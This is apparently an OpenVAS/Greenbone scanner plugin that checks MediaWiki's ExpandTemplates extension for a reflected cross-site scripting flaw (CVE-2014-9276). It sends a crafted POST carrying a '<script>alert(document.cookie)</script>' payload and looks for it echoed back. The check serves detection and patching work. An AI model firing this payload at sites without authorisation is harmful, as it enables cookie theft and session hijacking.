CPE = "cpe:/a:mediawiki:mediawiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805327" );
	script_version( "$Revision: 11872 $" );
	script_cve_id( "CVE-2014-9276", "CVE-2014-9478" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2015-01-23 12:37:41 +0530 (Fri, 23 Jan 2015)" );
	script_name( "MediaWiki ExpandTemplates extension Multiple Vulnerabilities - Jan15" );
	script_tag( name: "summary", value: "This host is installed with ExpandTemplates
  extension for MediaWiki is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP POST request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws exist when'$wgRawHtml' is set to true.

  - Input passed via 'wpInput' parameter in the script is not validated
     before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attacker to execute arbitrary script code in a user's browser
  session within the trust relationship between their browser and the server." );
	script_tag( name: "affected", value: "ExpandTemplates version before 1.24
  extension for MediaWiki." );
	script_tag( name: "solution", value: "Upgrade to ExpandTemplates version 1.24.1
  or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://phabricator.wikimedia.org/T773111" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2015/01/03/13" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "secpod_mediawiki_detect.sc" );
	script_mandatory_keys( "mediawiki/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.mediawiki.org/wiki/Extension:ExpandTemplates" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!wikiPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: wikiPort )){
	exit( 0 );
}
reqwiki = http_get( item: NASLString( dir, "/index.php/Special:Version" ), port: wikiPort );
reswiki = http_keepalive_send_recv( port: wikiPort, data: reqwiki );
if(IsMatchRegexp( reswiki, ">ExpandTemplates<" )){
	host = http_host_name( port: wikiPort );
	postData = NASLString( "contexttitle=&input=<html><script>alert(document.cookie)</script>
                      </html>&removecomments=1&wpEditToken=+\\" );
	url = dir + "/index.php/Special:ExpandTemplates";
	sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: ", url, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", "\\r\\n", postData, "\\r\\n" );
	rcvRes = http_keepalive_send_recv( port: wikiPort, data: sndReq );
	if(IsMatchRegexp( rcvRes, "HTTP/1\\.. 200" ) && ContainsString( rcvRes, "<script>alert(document.cookie)</script>" )){
		security_message( wikiPort );
		exit( 0 );
	}
}

